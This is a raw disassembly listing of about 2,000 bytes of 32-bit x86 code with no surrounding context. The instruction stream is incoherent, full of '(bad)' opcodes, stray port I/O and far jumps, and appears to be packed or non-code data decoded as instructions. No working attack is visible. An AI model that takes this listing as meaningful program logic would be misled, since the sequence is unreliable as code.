  41345f:	mov    ecx,0xb3b62bd1
  413464:	mov    esp,0xb8b49f83
  413469:	into   
  41346a:	std    
  41346b:	fs push ss
  41346d:	mul    BYTE PTR [ecx]
  41346f:	xchg   esi,eax
  413470:	outs   dx,DWORD PTR ds:[esi]
  413471:	mov    edx,0xb0d918a8
  413476:	ja     0x4134c7
  413478:	cmc    
  413479:	out    dx,al
  41347a:	adc    BYTE PTR [ebp-0x58e198a6],ah
  413480:	or     DWORD PTR [edi],0x4b4a9a72
  413486:	push   edx
  413487:	ret    0x4921
  41348a:	call   0xec01:0xc32bac80
  413491:	jb     0x4134af
  413493:	fisub  DWORD PTR [ebx+0x4d]
  413496:	retf   
  413497:	mov    al,ds:0xaa122409
  41349c:	loopne 0x413431
  41349e:	fucomp st(4)
  4134a0:	jae    0x4134d9
  4134a2:	cwde   
  4134a3:	sar    BYTE PTR [eax+edx*1-0x1c],1
  4134a7:	int    0xad
  4134a9:	push   0xffffffc8
  4134ab:	jbe    0x41342e
  4134ad:	adc    al,BYTE PTR [edi+eax*1+0x4336d641]
  4134b4:	adc    al,0x63
  4134b6:	mov    ebp,0x4a018df6
  4134bb:	mov    bh,0x4f
  4134bd:	mov    cl,0x47
  4134bf:	ss ja  0x4134b1
  4134c2:	xchg   esi,eax
  4134c3:	fist   DWORD PTR [eax-0x6a]
  4134c6:	int3   
  4134c7:	std    
  4134c8:	adc    cl,dh
  4134ca:	pop    ds
  4134cb:	daa    
  4134cc:	sub    ah,cl
  4134ce:	stos   WORD PTR es:[edi],ax
  4134d0:	in     eax,0xbe
  4134d2:	das    
  4134d3:	mov    dl,0xad
  4134d5:	sub    esp,ebx
  4134d7:	xor    bh,BYTE PTR [ecx]
  4134d9:	dec    esp
  4134da:	ds stos DWORD PTR es:[edi],eax
  4134dc:	cmp    DWORD PTR [ebp-0x62],esp
  4134df:	addr16 std 
  4134e1:	out    0xa8,eax
  4134e3:	adc    ah,al
  4134e5:	adc    esp,edi
  4134e7:	sahf   
  4134e8:	and    ecx,DWORD PTR [ebx-0x4e0de69a]
  4134ee:	mov    ds:0x7fd02c5e,eax
  4134f3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4134f5:	mov    ds,eax
  4134f7:	pop    ds
  4134f8:	xor    al,0x1b
  4134fa:	sub    ch,BYTE PTR [edx+0x2f]
  4134fd:	cdq    
  4134fe:	fs sar edi,0x4a
  413502:	xchg   ecx,eax
  413503:	adc    BYTE PTR [edx+0x644b3699],bl
  413509:	addr16 push esp
  41350b:	mov    DWORD PTR [ebp+0x3d716195],edx
  413511:	sbb    dl,ah
  413513:	adc    edi,DWORD PTR [edi]
  413515:	scas   eax,DWORD PTR es:[edi]
  413516:	mov    ebx,0x5361399a
  41351b:	sbb    bl,bl
  41351d:	pushf  
  41351e:	ss loop 0x4134c8
  413521:	mov    eax,ds:0x1fcff780
  413526:	in     al,0x60
  413528:	addr16 and ecx,esi
  41352b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41352c:	test   DWORD PTR [edx+0x4c],esp
  41352f:	jle    0x4134b7
  413531:	dec    esp
  413532:	dec    esp
  413533:	jno    0x413543
  413535:	sbb    eax,ebx
  413537:	data16 xor BYTE PTR [esp+ebp*4+0x64],dl
  41353c:	jle    0x4135b2
  41353e:	iret   
  41353f:	test   BYTE PTR [ebp+0xe],dh
  413542:	mov    eax,DWORD PTR [ecx]
  413544:	call   0xf6e:0xe9d71f73
  41354b:	imul   eax,DWORD PTR [eax+ebp*2-0x47f1d261],0x5a
  413553:	(bad)  
  413554:	ins    BYTE PTR es:[edi],dx
  413555:	mov    WORD PTR [edx-0x6b],?
  413558:	pop    ds
  413559:	sub    esp,DWORD PTR [esi+0x12]
  41355c:	push   es
  41355d:	out    dx,al
  41355e:	push   0x16fae0e6
  413563:	das    
  413564:	fucomp st(7)
  413566:	jb     0x413512
  413568:	cld    
  413569:	arpl   WORD PTR [edi+0x2cf7756d],sp
  41356f:	mov    ds:0xe34048ac,eax
  413574:	add    eax,0xe6641a48
  413579:	sub    DWORD PTR [esi+0xe4b5a4d],edx
  41357f:	popf   
  413580:	lahf   
  413581:	ror    BYTE PTR [ebp+edx*8+0x623c3639],1
  413588:	xor    al,0xfa
  41358a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41358b:	cwde   
  41358c:	jbe    0x4135c6
  41358e:	enter  0xbec4,0xc9
  413592:	aad    0xb6
  413594:	adc    al,0x63
  413597:	(bad)  
  413598:	or     eax,0x9f0d6052
  41359d:	lock adc ch,BYTE PTR [esi+ecx*4+0x4b]
  4135a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135a3:	mov    gs,WORD PTR [esi]
  4135a5:	test   eax,0xad75ba2f
  4135aa:	cwde   
  4135ab:	jg     0x413598
  4135ad:	pushf  
  4135ae:	cmp    al,0xfd
  4135b0:	adc    BYTE PTR [edx+0x14],al
  4135b3:	xchg   edx,eax
  4135b4:	sbb    ebp,DWORD PTR [eax+ecx*4+0x2d68ba69]
  4135bb:	sub    ch,cl
  4135bd:	into   
  4135be:	add    ah,ch
  4135c0:	dec    edx
  4135c1:	(bad)  
  4135c2:	pop    ss
  4135c3:	pop    ds
  4135c4:	(bad)  
  4135c6:	lahf   
  4135c7:	pop    ecx
  4135c8:	jno    0x41360e
  4135ca:	mov    dl,BYTE PTR [ebp-0x9f3f06d]
  4135d0:	xor    DWORD PTR [esi-0x4],ecx
  4135d3:	dec    esi
  4135d4:	mov    bh,0x1b
  4135d6:	cmp    al,bl
  4135d8:	idiv   dl
  4135da:	loop   0x4135f7
  4135dc:	xlat   BYTE PTR ds:[ebx]
  4135dd:	mov    ah,0x12
  4135df:	sti    
  4135e0:	out    dx,eax
  4135e1:	xlat   BYTE PTR ds:[ebx]
  4135e2:	mov    bl,0x83
  4135e4:	test   ah,cl
  4135e6:	add    ch,bh
  4135e8:	out    0x1,eax
  4135ea:	jp     0x4135e0
  4135ec:	test   ebp,edx
  4135ee:	add    BYTE PTR [ecx],0x74
  4135f1:	jmp    0xd12dd2f4
  4135f6:	cli    
  4135f7:	ficom  DWORD PTR [esi]
  4135f9:	push   cs
  4135fa:	and    al,0x83
  4135fc:	fisub  DWORD PTR [edx-0x61449dab]
  413602:	mov    edi,0x231ec2ba
  413608:	adc    BYTE PTR [edi+0x5f],ah
  41360b:	cs out 0xd4,al
  41360e:	cdq    
  41360f:	push   0x554d3ba4
  413614:	sahf   
  413615:	adc    ebp,DWORD PTR [eax+0x2dbcd3a5]
  41361b:	pop    ebx
  41361c:	cmp    edi,DWORD PTR [eax]
  41361e:	pusha  
  41361f:	nop
  413620:	inc    esi
  413621:	add    ebp,DWORD PTR [bp+si-0x2c]
  413625:	ficom  DWORD PTR [ebp+0x30]
  413628:	test   DWORD PTR [edx],eax
  41362a:	xor    BYTE PTR [ecx-0x28050d6f],0xdc
  413631:	stos   DWORD PTR es:[edi],eax
  413632:	(bad)  
  413633:	out    dx,al
  413634:	dec    esi
  413635:	adc    eax,0xe9063849
  41363a:	repnz outs dx,BYTE PTR ds:[esi]
  41363c:	mov    eax,ds:0xc6b19c6d
  413641:	push   eax
  413642:	inc    edx
  413643:	jle    0x4135fc
  413645:	outs   dx,BYTE PTR ds:[esi]
  413646:	xor    DWORD PTR [eax+esi*1+0x42],edx
  41364a:	add    al,0xd
  41364c:	scas   al,BYTE PTR es:[edi]
  41364d:	xor    edx,DWORD PTR [ecx+0x73]
  413650:	aam    0xc6
  413652:	inc    ebp
  413653:	fimul  DWORD PTR [esi+esi*1]
  413656:	lahf   
  413657:	lods   eax,DWORD PTR ds:[esi]
  413658:	and    al,0xe3
  41365a:	aaa    
  41365b:	ret    0xaa7c
  41365e:	mov    ds:0x36f9c5b2,al
  413663:	push   ds
  413664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413665:	add    DWORD PTR [edi+0x6c1103ff],ebx
  41366b:	repz enter 0xcad,0x42
  413670:	ja     0x4135f2
  413672:	adc    eax,0xde0912a2
  413677:	fisttp WORD PTR [ebx]
  413679:	dec    ecx
  41367a:	loopne 0x4136d1
  41367c:	push   0x65
  41367e:	inc    ebx
  41367f:	mov    ch,0x9c
  413681:	test   al,0x69
  413683:	push   ebp
  413684:	pop    esp
  413685:	ret    0xe9ef
  413688:	sbb    al,0xf1
  41368a:	push   ss
  41368b:	xor    BYTE PTR [eax+0x79],bl
  41368e:	nop
  41368f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413690:	push   ds
  413691:	scas   al,BYTE PTR es:[edi]
  413692:	push   esp
  413693:	xor    esp,DWORD PTR [ebp+ebx*2+0x468b336f]
  41369a:	loop   0x413684
  41369c:	bts    DWORD PTR [ecx+0x5ad4ab60],edi
  4136a3:	and    ch,dh
  4136a5:	xor    al,ch
  4136a7:	jp     0x413674
  4136a9:	pop    ds
  4136aa:	fnstsw WORD PTR [edx+edx*4+0x7a]
  4136ae:	push   ds
  4136af:	xor    eax,0x778a6dbf
  4136b4:	cmp    DWORD PTR [ecx+0x3c76bab2],edx
  4136ba:	mov    es,WORD PTR [eax+eiz*8+0x17]
  4136be:	dec    edx
  4136bf:	xor    cl,al
  4136c1:	data16 sub al,dh
  4136c4:	jae    0x4136af
  4136c6:	pop    edx
  4136c7:	call   0x8f235515
  4136cc:	mov    esi,0x33bef876
  4136d1:	push   ebx
  4136d2:	shr    BYTE PTR [esi+0x297448de],1
  4136d8:	pop    ebp
  4136d9:	adc    BYTE PTR ds:0xc2e57819,dh
  4136df:	popf   
  4136e0:	xchg   ebx,eax
  4136e1:	jo     0x413684
  4136e3:	arpl   WORD PTR [esi-0x40],si
  4136e6:	cmp    DWORD PTR [edi],ecx
  4136e8:	scas   eax,DWORD PTR es:[edi]
  4136e9:	scas   al,BYTE PTR es:[edi]
  4136ea:	mov    ch,0x13
  4136ec:	push   edx
  4136ed:	sub    eax,0x7d932b96
  4136f2:	mov    ah,0x46
  4136f4:	jmp    0xce9f:0x8d028897
  4136fb:	adc    BYTE PTR [esi-0x203ebc2e],0xc9
  413702:	adc    al,BYTE PTR [esi]
  413704:	xchg   esi,eax
  413705:	or     DWORD PTR [edx],esp
  413707:	inc    edi
  413708:	out    0xe8,eax
  41370a:	mov    dh,0x8a
  41370c:	fist   WORD PTR [ecx+0x3c085e0f]
  413712:	cmp    edi,DWORD PTR [ecx]
  413714:	sub    edx,ecx
  413716:	and    edi,DWORD PTR [esp+edx*2+0x1d75e5ea]
  41371d:	cmp    DWORD PTR [eax],esi
  41371f:	inc    esi
  413720:	cmp    al,BYTE PTR [ebp+0x57ec50ea]
  413726:	jne    0x413793
  413728:	cmc    
  413729:	xor    eax,0xefb6700b
  41372e:	dec    esp
  41372f:	cmp    dh,BYTE PTR [edx-0x53]
  413732:	or     eax,0xbfca14e5
  413737:	(bad)  
  413738:	mov    ecx,0xf29dd16f
  41373d:	mov    al,0x3b
  41373f:	nop
  413740:	mov    ah,0x4f
  413742:	ror    BYTE PTR [edx-0x46af7fab],1
  413748:	push   edx
  413749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41374a:	out    0x80,eax
  41374c:	pusha  
  41374d:	in     al,dx
  41374e:	int    0xd8
  413750:	js     0x413758
  413752:	mov    DWORD PTR [eax*4+0x67b2cad],0xd4e511ea
  41375d:	push   esi
  41375e:	sub    edi,DWORD PTR [eax+0x7f]
  413761:	cld    
  413762:	jl     0x413741
  413764:	jmp    0x6bcf6846
  413769:	mov    ch,0x2f
  41376b:	mov    eax,0x8fe4e4c6
  413770:	sub    al,0x97
  413772:	xchg   esp,eax
  413773:	das    
  413774:	push   ebp
  413775:	je     0x413708
  413777:	mov    cl,0x0
  413779:	pushf  
  41377a:	xor    edi,DWORD PTR [ebx+0x16e4268b]
  413780:	xor    esp,ebx
  413782:	jge    0x413710
  413784:	lock or ecx,DWORD PTR [ebx-0x23]
  413788:	loopne 0x4137a7
  41378a:	and    eax,0x7ea3b8b2
  41378f:	adc    bh,BYTE PTR [esp+ebx*2+0x233f73f4]
  413796:	shl    DWORD PTR [edx+esi*2-0x11],0x96
  41379b:	jp     0x4137b8
  41379d:	or     eax,0xa181cf16
  4137a2:	lods   eax,DWORD PTR ds:[esi]
  4137a3:	xor    al,0x72
  4137a5:	es xor eax,0xa537a9ed
  4137ab:	das    
  4137ac:	jg     0x4137e4
  4137ae:	pop    es
  4137af:	mov    ah,BYTE PTR [eax-0x54d7df7b]
  4137b5:	iret   
  4137b6:	inc    esp
  4137b7:	enter  0x29e9,0xda
  4137bb:	dec    eax
  4137bc:	es sub eax,0x795f9453
  4137c2:	retf   
  4137c3:	fdiv   DWORD PTR [eax+0x52a5f560]
  4137c9:	dec    esi
  4137ca:	inc    DWORD PTR [ecx+0x5c176002]
  4137d0:	repnz int 0x21
  4137d3:	int3   
  4137d4:	push   ecx
  4137d5:	ins    DWORD PTR es:[di],dx
  4137d7:	xchg   edx,ecx
  4137d9:	ss retf 0x8658
  4137dd:	ror    BYTE PTR [edx],1
  4137df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e0:	bound  ecx,QWORD PTR [edx+ebp*8+0x62]
  4137e4:	cmp    BYTE PTR [ecx+ebx*8],cl
  4137e7:	leave  
  4137e8:	inc    esi
  4137e9:	mov    ch,BYTE PTR [esi+ebx*1-0x6c6a4fe4]
  4137f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137f1:	pop    edi
  4137f2:	aam    0xd3
  4137f4:	jb     0x41377c
  4137f6:	loop   0x413846
  4137f8:	into   
  4137f9:	jns    0x41380c
  4137fb:	stc    
  4137fc:	lods   al,BYTE PTR ds:[esi]
  4137fd:	add    BYTE PTR [edi+0x29047478],bh
  413803:	jne    0x41383c
  413805:	sub    ebp,DWORD PTR [eax+0x23300f2f]
  41380b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41380c:	xchg   edx,eax
  41380d:	sub    BYTE PTR [edi],dh
  41380f:	ja     0x4137c3
  413811:	jno    0x413891
  413813:	gs push es
  413815:	outs   dx,BYTE PTR ds:[esi]
  413816:	test   al,0xac
  413818:	leave  
  413819:	inc    DWORD PTR [edi+0x276ea930]
  41381f:	mov    eax,DWORD PTR [esi+ebx*4]
  413822:	js     0x4137e4
  413824:	cmp    eax,0x4f3f7afd
  413829:	mov    WORD PTR [ecx+eiz*1-0x1f],fs
  41382d:	push   eax
  41382e:	fprem  
  413830:	fadd   QWORD PTR [edi+0x25]
  413833:	mov    bl,0x7a
  413835:	outs   dx,BYTE PTR ds:[esi]
  413836:	lock sub ah,cl
  413839:	mov    eax,0xaa19896b
  41383e:	pop    eax
  41383f:	imul   edx,eax,0xffffffb5
  413842:	pop    ebp
  413843:	sbb    edi,DWORD PTR [esi-0x17]
  413846:	jg     0x41381d
  413848:	(bad)  
  413849:	into   
  41384a:	int    0x7d
  41384c:	push   es
  41384d:	sub    al,0x71
  41384f:	mov    bh,BYTE PTR ds:0xd00cb2ac
  413855:	cmc    
  413856:	push   ebx
  413857:	sbb    BYTE PTR [eax-0x99a9d66],0x74
  41385e:	xchg   ebp,eax
  41385f:	xor    BYTE PTR [edx-0x3c195d00],cl
  413865:	inc    ecx
  413866:	and    cl,BYTE PTR [edx-0x4d]
  413869:	mov    ds:0x3bfe8f97,eax
  41386e:	or     bh,BYTE PTR [ebx+0x59]
  413871:	adc    edi,esi
  413873:	push   edx
  413874:	shl    BYTE PTR [ebx],0x5
  413877:	mov    ecx,0xe19d59cb
  41387c:	outs   dx,BYTE PTR ds:[esi]
  41387d:	inc    edi
  41387e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41387f:	hlt    
  413880:	mov    ecx,0xbf1e5915
  413885:	mov    ebp,0x88f0d8a
  41388a:	sbb    BYTE PTR [ebx],bh
  41388c:	xchg   DWORD PTR [ecx+0x25],edi
  41388f:	aaa    
  413890:	lods   al,BYTE PTR ds:[esi]
  413891:	jmp    0x4138f9
  413893:	mov    DWORD PTR [ebp-0x59f299e0],esi
  413899:	gs ins DWORD PTR es:[edi],dx
  41389b:	inc    BYTE PTR cs:[eax]
  41389e:	leave  
  41389f:	jle    0x41389a
  4138a1:	scas   al,BYTE PTR es:[edi]
  4138a2:	mov    DWORD PTR [edx-0x598e0bf0],ecx
  4138a8:	and    al,0xa5
  4138aa:	push   ebp
  4138ab:	xchg   BYTE PTR [esi-0x62a49d24],cl
  4138b1:	shr    BYTE PTR [esi+0x1865e95e],cl
  4138b7:	test   BYTE PTR [eax-0x70],ch
  4138ba:	inc    esp
  4138bb:	inc    ebx
  4138bc:	mov    ebp,0xda39652c
  4138c1:	pop    edx
  4138c2:	cld    
  4138c3:	ss in  eax,0x40
  4138c6:	test   ecx,eax
  4138c8:	mov    ebx,0x8242b630
  4138cd:	in     eax,0xf7
  4138cf:	mov    ebx,0x26567414
  4138d4:	xchg   BYTE PTR [edx],cl
  4138d6:	xchg   ebp,eax
  4138d7:	mov    ds:0x5d5c42b,al
  4138dc:	push   eax
  4138dd:	mov    WORD PTR [ebp+0x1f],cs
  4138e0:	push   edi
  4138e1:	mov    eax,ds:0x3ba188c4
  4138e6:	push   eax
  4138e7:	mov    BYTE PTR [ecx],dh
  4138e9:	ds jle 0x41394f
  4138ec:	aaa    
  4138ed:	rol    DWORD PTR [edi+0x5c],1
  4138f0:	pop    esi
  4138f1:	push   edx
  4138f2:	and    ebp,DWORD PTR [edi+0x6f]
  4138f5:	mov    ch,0xa4
  4138f7:	mov    cl,0x4f
  4138f9:	div    DWORD PTR [edx-0x3f]
  4138fc:	fs sub al,0x60
  4138ff:	je     0x4138d7
  413901:	fnstcw WORD PTR [esi+0x40bc6d27]
  413907:	sbb    eax,0x8bbd536b
  41390c:	aad    0xa2
  41390e:	add    DWORD PTR [ebp-0x6f],esi
  413911:	jae    0x413950
  413913:	bound  esi,QWORD PTR [ecx+edx*2+0x7283a316]
  41391a:	and    ebx,DWORD PTR [edx]
  41391c:	or     al,0x42
  41391e:	stc    
  41391f:	mov    ds:0x68e5ccc1,al
  413924:	pop    esi
  413925:	gs ss mov ebp,0xa6db5d0c
  41392c:	(bad)  
  41392d:	jns    0x4138e6
  41392f:	mov    DWORD PTR [edi+0x3db6895f],0x1053f19a
  413939:	lods   eax,DWORD PTR ds:[esi]
  41393a:	(bad)  
  41393b:	aam    0x7
  41393d:	popa   
  41393e:	jmp    0xeb7fb767
  413943:	mov    ds:0xecd20899,al
  413948:	js     0x4138e5
  41394a:	js     0x413989
  41394c:	push   edx
  41394d:	popa   
  41394e:	or     BYTE PTR [ebp+0x7c],al
  413951:	push   ebp
  413952:	jae    0x41392c
  413954:	daa    
  413955:	lock (bad) 
  413957:	int    0x6
  413959:	xor    ecx,ecx
  41395b:	imul   edx,DWORD PTR [esp+edi*2-0x53cb33c8],0x999199fe
  413966:	int3   
  413967:	sub    BYTE PTR [edx+0x68a704f2],0x29
  41396e:	xchg   ch,dl
  413970:	test   BYTE PTR [eax-0x68],al
  413973:	and    eax,0x54fce68f
  413978:	out    0x25,al
  41397a:	jns    0x413938
  41397c:	in     eax,0xe0
  41397e:	sub    eax,0x1ff35234
  413983:	cmp    edx,DWORD PTR [edx+0x65]
  413986:	xor    DWORD PTR [eax-0x21],esp
  413989:	sub    BYTE PTR [eax],dh
  41398b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41398c:	je     0x413938
  41398e:	lds    edx,FWORD PTR [eax-0x650cbef1]
  413994:	sar    BYTE PTR [ebx],cl
  413996:	addr16 sbb eax,0xa3131660
  41399c:	and    edi,DWORD PTR [edx+0x38]
  41399f:	or     DWORD PTR [ebp-0x6f],ebx
  4139a2:	and    eax,0x99932c58
  4139a7:	(bad)  
  4139a8:	call   0x8f8c7cd2
  4139ad:	dec    ebx
  4139ae:	test   ebp,esi
  4139b0:	or     DWORD PTR [ebx-0x2259af30],0x90add14c
  4139ba:	or     eax,ecx
  4139bc:	add    edx,edx
  4139be:	arpl   dx,di
  4139c0:	xchg   esp,eax
  4139c1:	cli    
  4139c2:	cmp    eax,0x19eef3ca
  4139c7:	daa    
  4139c8:	jae    0x413952
  4139ca:	rcr    cl,0x5b
  4139cd:	jg     0x4139ea
  4139cf:	dec    ebp
  4139d0:	jnp    0x413a4e
  4139d2:	mov    dl,0x2a
  4139d4:	outs   dx,BYTE PTR ds:[esi]
  4139d5:	or     DWORD PTR [ebx-0x5b4e7e8],esi
  4139db:	jge    0x413a2b
  4139dd:	fisubr DWORD PTR [ecx+eax*8]
  4139e0:	push   ecx
  4139e1:	cmp    DWORD PTR [edi+0x29334e32],esi
  4139e7:	jbe    0x413971
  4139e9:	push   ebx
  4139ea:	pusha  
  4139eb:	nop
  4139ec:	outs   dx,DWORD PTR ds:[esi]
  4139ed:	fst    st(7)
  4139ef:	mov    ebp,0xd8f6e
  4139f4:	push   ecx
  4139f5:	pop    es
  4139f6:	pop    ebp
  4139f7:	shl    DWORD PTR [edi+0x2122dd86],0x48
  4139fe:	aaa    
  4139ff:	into   
  413a00:	xchg   esi,eax
  413a01:	aad    0xd1
  413a03:	lods   eax,DWORD PTR ds:[esi]
  413a04:	test   DWORD PTR [esi+0x1c],0xb210ea67
  413a0b:	aaa    
  413a0c:	js     0x4139aa
  413a0e:	repnz lea edx,[ecx+0x21]
  413a12:	pushf  
  413a13:	cmp    BYTE PTR [edx+0x34],bl
  413a16:	imul   edx,DWORD PTR ds:0x2272cbc1,0xffffffab
  413a1d:	in     al,0xb5
  413a1f:	bndstx [edi+0x1b],(bad)
  413a23:	test   eax,0x8b41e065
  413a28:	repz inc ebp
  413a2a:	adc    eax,edi
  413a2c:	fistp  WORD PTR [ecx]
  413a2e:	int3   
  413a2f:	aad    0x3e
  413a31:	repnz add al,0xcf
  413a34:	bound  edx,QWORD PTR [edi+0x58acc0d]
  413a3a:	add    BYTE PTR [edi+0x2b],al
  413a3d:	and    ebp,DWORD PTR [eax+0x2c7962f5]
  413a43:	dec    eax
  413a44:	in     al,0x19
  413a46:	pushf  
  413a47:	in     al,0xbf
  413a49:	mov    ah,0x51
  413a4b:	rcr    BYTE PTR [ecx],cl
  413a4d:	ss aas 
  413a4f:	sub    BYTE PTR [edx-0x50],al
  413a52:	call   0x9d96:0x2b0e2802
  413a59:	adc    al,0xa1
  413a5b:	ret    
  413a5c:	pop    es
  413a5d:	xchg   edi,eax
  413a5e:	dec    ebx
  413a5f:	sub    BYTE PTR [ebx+0x20],bl
  413a62:	xchg   esi,eax
  413a63:	xchg   edi,eax
  413a65:	lods   al,BYTE PTR ds:[esi]
  413a66:	cmp    ebp,DWORD PTR [bx+si-0x30]
  413a6a:	sbb    eax,0x922e3ca8
  413a6f:	fs mov bl,0x83
  413a72:	fst    DWORD PTR [ebx+eiz*8+0x1995b61b]
  413a79:	add    al,0x65
  413a7b:	retf   0x7000
  413a7e:	xchg   ebp,eax
  413a7f:	sahf   
  413a80:	int3   
  413a81:	jns    0x413a3e
  413a83:	mov    cl,ah
  413a85:	jns    0x413a36
  413a87:	out    dx,eax
  413a88:	adc    BYTE PTR [ebx-0x2d],ah
  413a8b:	pop    esi
  413a8c:	cmp    DWORD PTR [ecx+0x6f],esi
  413a8f:	addr16 push esp
  413a91:	lea    eax,[edx-0x2608a685]
  413a97:	fsubr  st(3),st
  413a9a:	mov    edx,0x39359e0
  413a9f:	xchg   DWORD PTR [ebx+esi*2],ecx
  413aa2:	mov    ebp,0xe32448de
  413aa7:	cmc    
  413aa8:	popf   
  413aa9:	test   al,0xb6
  413aab:	daa    
  413aac:	pusha  
  413aad:	mov    ds:0x784e7b13,eax
  413ab2:	push   cs
  413ab3:	idiv   BYTE PTR [eax+0x14f425c7]
  413ab9:	ror    DWORD PTR [edi+0x5ebeafb5],1
  413abf:	mov    edi,0xd7582370
  413ac4:	pop    ss
  413ac5:	call   DWORD PTR [edi+eiz*4-0x29]
  413ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aca:	das    
  413acb:	cdq    
  413acc:	int    0x2c
  413ace:	push   esi
  413acf:	mov    cl,0xbc
  413ad1:	sti    
  413ad2:	push   cs
  413ad3:	xlat   BYTE PTR ds:[ebx]
  413ad4:	cmp    edx,DWORD PTR [ebx]
  413ad6:	mov    edi,DWORD PTR [esi]
  413ad8:	mov    ebp,ebx
  413ada:	gs mov dl,0xbe
  413add:	sbb    bh,BYTE PTR [eax]
  413adf:	retf   0xc892
  413ae2:	sbb    bh,0xdc
  413ae5:	ret    
  413ae6:	pop    es
  413ae7:	mov    al,0xd0
  413ae9:	das    
  413aea:	ret    0x86a
  413aed:	pop    edx
  413aee:	mov    eax,ds:0xa77f3cc9
  413af3:	push   esp
  413af4:	mov    cl,0x45
  413af6:	xchg   esi,eax
  413af7:	cmp    eax,ecx
  413af9:	shl    edx,0xe0
  413afc:	sub    eax,0xbb436be2
  413b01:	or     BYTE PTR [eax+0x1f3b0d9a],cl
  413b07:	hlt    
  413b08:	sti    
  413b09:	ja     0x413b5f
  413b0b:	lods   eax,DWORD PTR ds:[esi]
  413b0c:	push   es
  413b0d:	cmp    DWORD PTR ss:[eax],ebp
  413b10:	rcl    dl,cl
  413b12:	push   edi
  413b13:	or     eax,0x72488b2e
  413b18:	lock mov bh,0x6e
  413b1b:	xlat   BYTE PTR ds:[ebx]
  413b1c:	into   
  413b1d:	popf   
  413b1e:	ret    0x6ebd
  413b21:	(bad)  
  413b22:	adc    DWORD PTR ss:[esi-0x15c144a2],esp
  413b29:	xchg   DWORD PTR [eax+eiz*2-0x37],ebx
  413b2d:	mov    ds:0x5c890114,al
  413b32:	jnp    0x413b3e
  413b34:	rcr    ebp,1
  413b36:	imul   ebx,DWORD PTR [ecx-0x6],0x7e1b3d30
  413b3d:	mov    bl,0xfb
  413b3f:	rcr    edi,1
  413b41:	xchg   esi,eax
  413b42:	call   0x4d02:0x7cf51710
  413b49:	cmp    esp,DWORD PTR [ecx-0x247d4e71]
  413b4f:	retf   
  413b50:	out    dx,al
  413b51:	push   0xffffffee
  413b53:	xlat   BYTE PTR ds:[ebx]
  413b54:	and    esi,ebp
  413b56:	and    BYTE PTR [edi+0x3a],dh
  413b59:	hlt    
  413b5a:	mov    ah,0x2f
  413b5c:	inc    eax
  413b5d:	fbld   TBYTE PTR [edi]
  413b5f:	das    
  413b60:	push   ebx
  413b61:	hlt    
  413b62:	jbe    0x413bbc
  413b64:	cmp    al,BYTE PTR [edi-0x11]
  413b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b68:	jp     0x413be3
  413b6a:	call   0x5117122d
  413b6f:	mov    ds:0xd83f114f,eax
  413b74:	mov    esi,0x4c882f8e
  413b79:	sub    DWORD PTR [ebx],esp
  413b7b:	daa    
  413b7c:	cmp    al,0x68
  413b7e:	sahf   
  413b7f:	push   ebx
  413b80:	inc    edi
  413b81:	test   al,0xaa
  413b83:	add    eax,0xa6ad2f26
  413b88:	daa    
  413b89:	push   0xffffff98
  413b8b:	mov    BYTE PTR [ebx],bh
  413b8d:	mov    BYTE PTR [edi],dl
  413b8f:	jb     0x413bd3
  413b91:	pop    esp
  413b92:	mov    ecx,0x696ce8aa
  413b97:	mov    bh,0x85
  413b99:	rol    dh,cl
  413b9b:	retf   0xa07f
  413b9e:	inc    eax
  413b9f:	es dec edx
  413ba1:	pop    edx
  413ba2:	dec    esp
  413ba3:	jb     0x413c19
  413ba5:	(bad)  
  413ba6:	mov    ah,0x59
  413ba8:	sub    eax,0x8ef16dc0
  413bad:	pop    ebx
  413bae:	jmp    0x83a3:0xc42557e0
  413bb5:	scas   eax,DWORD PTR es:[edi]
  413bb6:	std    
  413bb7:	push   eax
  413bb8:	push   esp
  413bb9:	sub    eax,edi
  413bbb:	inc    esp
  413bbc:	ds (bad) 
  413bbe:	call   0x856679da
  413bc3:	hlt    
  413bc4:	or     eax,0x2022d4c5
  413bc9:	jg     0x413c08
  413bcb:	jp     0x413bde
  413bcd:	sbb    al,0x45
  413bcf:	add    eax,0xd297331c
  413bd4:	add    al,0xfe
  413bd6:	pop    esi
  413bd7:	loope  0x413b9f
  413bd9:	sub    eax,ebx
  413bdb:	mov    edi,0x6b8aa898
  413be0:	inc    ebp
  413be1:	inc    edx
  413be2:	push   esp
  413be3:	(bad)  
  413be4:	hlt    
  413be5:	push   cs
  413be6:	dec    esp
  413be7:	inc    esi
  413be8:	xchg   ecx,eax
  413be9:	aad    0x3
  413beb:	dec    eax
  413bec:	fbld   TBYTE PTR [ecx]
  413bee:	mov    edi,0xa80a923d
  413bf3:	cld    
  413bf4:	stc    
  413bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bf6:	jae    0x413b8a
  413bf8:	out    0xf9,al
  413bfa:	sbb    bh,BYTE PTR [ecx-0x5c]
  413bfd:	out    dx,eax
  413bfe:	retf   
  413bff:	out    0x58,eax
  413c01:	scas   eax,DWORD PTR es:[edi]
  413c02:	popf   
  413c03:	mov    dh,0xa9
  413c05:	and    DWORD PTR [ecx-0x35],esi
  413c08:	(bad)  
  413c09:	adc    al,0x4
  413c0b:	mov    al,0x14
  413c0d:	in     eax,0x57
  413c0f:	xchg   esi,eax
  413c10:	fist   WORD PTR [ebx]
  413c12:	fldenv [edx]
  413c14:	cmp    al,0xdb
  413c16:	sbb    al,0x18
  413c18:	(bad)  
  413c19:	lds    edi,FWORD PTR [esi+ecx*4+0x425365d]
  413c20:	xor    DWORD PTR [ecx],ebp
  413c22:	into   
  413c23:	push   es
  413c24:	test   DWORD PTR [eax+eiz*4-0x48],eax
  413c28:	mov    ds:0x648933a1,al
  413c2d:	push   0xfffffff3
  413c2f:	dec    esp
